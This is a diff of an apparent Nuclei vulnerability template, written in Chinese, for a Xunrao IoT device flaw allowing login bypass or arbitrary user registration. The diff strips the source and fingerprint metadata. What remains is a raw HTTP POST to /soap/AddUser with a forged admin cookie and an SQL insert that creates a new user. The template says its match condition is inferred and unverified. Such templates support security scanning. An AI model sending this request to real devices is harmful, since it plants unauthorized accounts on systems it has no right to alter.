@@ -3,14 +3,8 @@ info:
   name: 迅饶科技物联网设备存在登录绕过或任意用户注册漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kuoqi8sdw135vny9
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kuoqi8sdw135vny9
-    fofa: icon_hash="-1384370370"
 http:
 - raw:
   - "POST /soap/AddUser HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 125\nAccept: application/json, text/plain, */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: language=zh-cn; language=zh-cn;username=admin\nConnection: close\n\ninsert into userid (USERNAME,PASSWORD,PURVIEW,LOGINDATE,LOGINTIME)\n     values('test123','1234566','0','2024-5-6','10:25:36')"
